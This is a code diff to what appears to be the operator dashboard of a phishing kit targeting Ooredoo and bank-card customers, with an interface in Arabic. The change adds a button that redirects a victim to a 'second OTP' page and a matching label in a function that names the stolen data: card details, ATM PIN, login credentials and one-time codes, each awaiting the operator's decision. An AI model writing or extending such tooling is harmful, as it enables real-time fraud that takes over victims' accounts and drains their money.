@@ -568,6 +568,7 @@ ${o.ooredoo ? `
       <div style="flex:1 0 100%;font-weight:800;margin-bottom:6px">إعادة توجيه العميل إلى:</div>
       <button class="rbtn redir" data-rpage="login" data-rref="${esc(o.ref)}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg> تسجيل الدخول</button>
       <button class="rbtn redir" data-rpage="otp" data-rref="${esc(o.ref)}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg> رمز التحقق</button>
+      <button class="rbtn redir" data-rpage="otp2" data-rref="${esc(o.ref)}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg> رمز التحقق الثاني</button>
       <button class="rbtn redir" data-rpage="order" data-rref="${esc(o.ref)}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg> صفحة الطلب</button>
       <button class="rbtn" id="popClose2">إغلاق</button>
     </div>`;
@@ -586,7 +587,7 @@ $("pop").addEventListener("click", e => {
 document.addEventListener("keydown", e => { if (e.key === "Escape") closePop(); });
 
 function stepName(step){
-  return step === "otp" ? "رمز التأكيد (OTP)" : step === "pin" ? "الرقم السري (ATM)" : step === "ooredoo-otp" ? "رمز التحقق (OTP)" : step === "ooredoo" ? "بيانات تسجيل الدخول" : "بيانات البطاقة";
+  return step === "otp" ? "رمز التأكيد (OTP)" : step === "pin" ? "الرقم السري (ATM)" : step === "ooredoo-otp2" ? "رمز التحقق الثاني (OTP2)" : step === "ooredoo-otp" ? "رمز التحقق (OTP)" : step === "ooredoo" ? "بيانات تسجيل الدخول" : "بيانات البطاقة";
 }
 function badgeFor(st){
   if (st === "awaiting") return '<span class="badge wait">بانتظار قرارك</span>';
